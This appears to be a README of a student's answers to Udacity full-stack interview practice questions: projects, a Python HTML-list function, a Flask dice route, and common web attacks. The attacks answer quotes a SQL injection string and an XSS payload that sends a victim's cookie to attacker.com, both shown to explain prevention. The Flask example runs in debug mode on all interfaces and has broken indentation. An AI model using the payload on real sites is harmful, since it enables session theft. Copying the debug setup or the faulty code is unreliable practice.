# udacity-interview-practice-response
**1) What is the most influential book or blog post you’ve read regarding web development?**

The most influential book I have read is, “JavaScript the definitive guide” by David Flanagan
It is a great desk side reference and has good set of examples.

**2) Tell me about a web application you have built. Why did you choose to build it? What did you learn? What challenges did you face and how did you overcome them?**

I built a Neighborhood map web application. It is a single-page application featuring a map of my local neighborhood.
I chose to build it because quite a few businesses applications will want to integrate google maps and customize it to enhance the user experience.

I learned to use Knockout.js library with the MVVM pattern and also researched and integrated with third party apis. (Google Maps, Four Square, Yelp reviews).

There were several challenges, first was understanding what would be the best layout of web page and how to make the page responsive for different devices.
How to customize the map, include map markers, a search function for the locations, and a list view to support simple browsing of all locations making sure to use Knockout.js to accomplish the tasks.
I overcame these challenges by researching online, reading the documentation and using tools like Postman, Chrome developer tools. I also tried out the code in small iterations to understand how the library or api works.

***3)  Write a function in Python that takes a list of strings and returns a single string that is an HTML unordered list `(<UL>...</UL>)` of those strings. You should include a brief explanation of your code. Then, what would you have to consider if the original list was provided by user input?***

```python
'''
The function below takes in a list of strings
and returns them as an HTML unordered list. (<UL>...</UL>)
'''

def generateHtmlList(*args):
	html = "<ul>\n";
	for s in args:
		html += "<li>" + str(s) + "</li>\n"
	html += "</ul>"
	return html

print(generateHtmlList("test1", "test2", "test3"))
```
If the list is provided by user input. We can check that the input string to match only certain allowed characters. (example: only alphanumerics allowed)

***4) List 2-3 attacks that web applications are vulnerable to. How do these attacks work? How can we prevent those attacks?***

**Injection.**

Injection flaws can be SQL, NoSQL, OS and LDAP injection.
These occur when untrusted data is sent to an interpretor as part of a command or query.

Example: SQL injection
```
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";

The attacker modifies the ‘id’ parameter value in
their browser to send: ' or '1'='1
```
We can prevent them by keeping data separate from commands, use of safe API that avoids use of interpretor entirely or provides a parametrized interface to access the interpretor or use of ORMs.
Also we can use positive white list for server side validation.

**Broken Authentication**

It involves using of lists of known passwords to break into systems. Application session timeout when not set properly can also cause failed authentication.

Example:
Lists of known passwords are used to break into system.
If there is no automatic threat protection application can be used to determine if credentials are valid.

Some things to prevent are, using multifactor authentication.
Not shipping or deploying with default credentials. Making sure to implement a session timeout.

**Cross Site Scripting.**

Occurs whenever an application includes untrusted data into a web page without proper validation or escaping. This allows attackers to execute scripts in the victims browser, hijack there user session, redirect them to malicious sites and or deface websites.

Example:
The application uses untrusted data in the
construction of the following HTML snippet without validation or escaping:
```
(String)page += "<input name='creditcard' type='TEXT'
value='" + request.getParameter("CC") + "'>";

The attacker modifies the ‘CC’ parameter in the browser to:
'><script>document.location='http://www.attacker.com/cgi/bin/cookie.cgi?foo=' + document.cookie </script>'

This attack causes the victim’s session ID to be sent to the attacker’s website.
```
Prevention involves using frameworks that automatically escape XSS.
Escaping untrusted HTTP request data based on the context in the HTML output.



***5) Here is some starter code for a Flask Web Application. Expand on that and include a route that simulates rolling two dice and returns the result in JSON. You should include a brief explanation of your code.***

The code uses python libraries, jsonify and random. The route lets you enter the number of dice to roll. It then generates a random number between 1 and 6 for each of the dice. The sum of the numbers is then returned as json.
```python
from flask import Flask, jsonify
import random
import json

app = Flask(__name__)

@app.route('/')
def hello_world():
 return 'Hello World!'

@app.route('/rolldice/<int:number_of_dice>/JSON')
def rolldiceJSON(number_of_dice):
"""
Gets a random number between 1 and 6 for each of the number_of_dice passed in.
The total amount is printed out.
"""
	total = 0;
	for i in range(number_of_dice):
 		total += random.randint(1,6)
	return jsonify(total=total)


if __name__ == '__main__':
  app.debug = True
  app.run(host='0.0.0.0', port=5000)
```
***6) If you were to start your full-stack developer position today, what would be your goals a year from now?***

My goals would be to understand the business requirements of the position and to deliver projects aligned with them.

Enhance my technical skills with work in Node.js and in AWS Cloud.
Making sure code is well documented, good development documentation provided as needed.

Code defects are low or non-existent. Follow ups done with Code review and client feedback.

Making sure tools and process are in place for good development and automatic checks on the work done.

Deliver value to company through well implemented projects.
Ensure good communication with team and follow up with action plans.
